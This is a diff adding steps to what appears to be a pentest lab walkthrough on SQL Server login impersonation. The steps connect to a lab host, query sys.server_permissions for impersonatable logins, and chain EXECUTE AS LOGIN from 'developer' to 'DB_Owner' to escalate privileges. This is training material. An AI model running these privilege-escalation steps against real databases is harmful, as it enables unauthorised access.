@@ -63,7 +63,54 @@ SQL Server has a special permission, named impersonate, this enables one user to
 2. Download and start heidiSQL.
 3. Click on "New" on the left bottom and configure the following settings:
 
-*
+* Network Type: `Microsoft SQL Server (TCP/IP)`
+* Library: `SQLOLEDB`
+* Hostname / IP: `WEB01.amsterdam.bank.local`
+* Select: "Use Windows Authentication"
+* Port: `1433`
+
+![](<../../../../.gitbook/assets/image (33).png>)
+
+4\. Click "OK" on the security Issue warning.
+
+5\. Click on the "Query" tab and enter the following Query to check which users can be impersonated by the current user:
+
+```
+-- Find users that can be impersonated
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+```
+
+We can impersonate the Developer user.
+
+![](<../../../../.gitbook/assets/image (62).png>)
+
+6\. Impersonate the Developer user with the following Query:
+
+```
+EXECUTE AS LOGIN = 'developer'
+```
+
+![](<../../../../.gitbook/assets/image (42).png>)
+
+{% hint style="info" %}
+Make sure the Master database is selected since the developer user doesn't have access to the production database.
+{% endhint %}
+
+7\. Execute the who can be impersonated query again:
+
+![](<../../../../.gitbook/assets/image (56).png>)
+
+8\. Impersonate DB\_Owner:
+
+```
+EXECUTE AS LOGIN = 'DB_Owner'
+```
+
+We successfully impersonated Developer and then DB\_Owner.
 
 ## Defending
 
